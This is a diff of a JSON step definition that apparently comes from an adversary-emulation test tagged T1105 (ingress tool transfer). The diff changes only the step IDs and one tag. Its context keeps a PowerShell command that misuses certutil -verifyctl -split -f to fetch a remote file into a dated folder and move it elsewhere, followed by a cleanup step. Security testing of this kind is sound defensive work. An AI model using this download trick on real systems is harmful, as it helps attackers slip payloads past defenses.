@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "37f9d7cf-bfd3-4a32-954a-bcfa713027eb",
+      "id": "05a08b7d-ba86-4d70-9d90-cc93202153ab",
       "type": "execute-command",
       "data": {
         "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "54c284af-733e-4420-b462-5b1a20af5b20",
+      "id": "3555844d-832f-4b41-a004-c5c7e6da8f4c",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore\n",
@@ -27,19 +27,18 @@
   ],
   "flows": [
     {
-      "s": "37f9d7cf-bfd3-4a32-954a-bcfa713027eb",
+      "s": "05a08b7d-ba86-4d70-9d90-cc93202153ab",
       "p": "on-success",
-      "o": "54c284af-733e-4420-b462-5b1a20af5b20"
+      "o": "3555844d-832f-4b41-a004-c5c7e6da8f4c"
     },
     {
-      "s": "37f9d7cf-bfd3-4a32-954a-bcfa713027eb",
+      "s": "05a08b7d-ba86-4d70-9d90-cc93202153ab",
       "p": "on-failure",
-      "o": "54c284af-733e-4420-b462-5b1a20af5b20"
+      "o": "3555844d-832f-4b41-a004-c5c7e6da8f4c"
     }
   ],
   "tags": [
-    "T1105",
-    "atomic-red-team"
+    "T1105"
   ],
   "input_arguments": [
     {
